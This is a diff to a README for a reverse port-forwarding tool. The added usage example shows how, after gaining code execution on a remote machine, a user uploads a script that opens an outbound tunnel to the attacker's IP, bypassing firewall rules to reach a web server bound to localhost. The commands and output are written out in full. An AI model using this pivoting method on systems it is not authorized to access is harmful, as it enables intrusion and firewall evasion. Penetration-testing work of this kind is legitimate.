@@ -15,8 +15,8 @@ I've choosen a reverse connection logic (remote -> local) instead of a simple bi
 it's better to escape firewall rules.  
 Once the connection is established you are ready to forward packets to the remote machine 
 by simply sending requests to the RPPF service address (ex. localhost:4444).  
-Then the requests will be tunneled to the endpoint of the tunnel which is the ***remote port forward*** program. At last, this script is a simple proxy and it will act on behalf of you, forwarding packets to the target address (that you must specifiy during startup).
-Look at bottom page for an example.
+Then the requests will be tunneled to the endpoint of the tunnel which is the ***remote port forward*** program. At last, this script is a simple proxy and it will act on behalf of you, forwarding packets to the target address (that you must specifiy during startup).  
+Look at bottom page for a simple example.
 
 ## Help menu
 
@@ -84,3 +84,46 @@ optional arguments:
 ```
 
 ## Simple use case
+
+Let's suppose I want to get access to a web server listeining to 127.0.0.1:80 in a remote machine.  
+Obviously I need rce, and a way to upload `remote_portfwd.py`.  
+Once I got the program on the remote machine I can begin the attack.  
+*Order is not important, you can run before or after `local_portfwd.py`. No matter.*  
+  
+On remote 
+```shell
+$ python remote_portfwd.py 10.10.14.19:4444 localhost:80
+creating tunnel to ('10.10.14.19', 4444)
+
+```
+Where `10.10.14.19` is my local IP address and `4444`  is the port where I want to create the RPPF tunnel.  
+  
+Then on your local machine
+```shell
+$ ./local_portfwd.py 10.10.14.19:4444 localhost:4242
+Waiting for incoming tunnel connection...
+Tunnel created
+Opening rppf listening service...
+--------------------------------------------
+RPPF Service opened on ('localhost', 4242)
+Ready to transfer data
+
+```
+Now the RPPF forward service is **ready and listening** on port 4242.
+`10.10.14.19` is the IP to bind to, can be also `0.0.0.0` to listen on every interface.
+  
+If you go back to remote console the output should have been updated :
+```shell
+$ python remote_portfwd.py 10.10.14.19:4444 localhost:80
+creating tunnel to ('10.10.14.19', 4444)
+tunnel created
+opening forward connection to ('localhost', 80)
+connection created
+--------------------------------------------
+Ready to transfer data
+
+```
+This means that the also the remote service is **ready and running**.  
+  
+Now you can just type `localhost:4242` in your web browser to connect to the site as a localhost. :smile:  
+***NOTE** : For an http request you may need to modify the HOST header (just intercept the request before being sent to layer 4).*
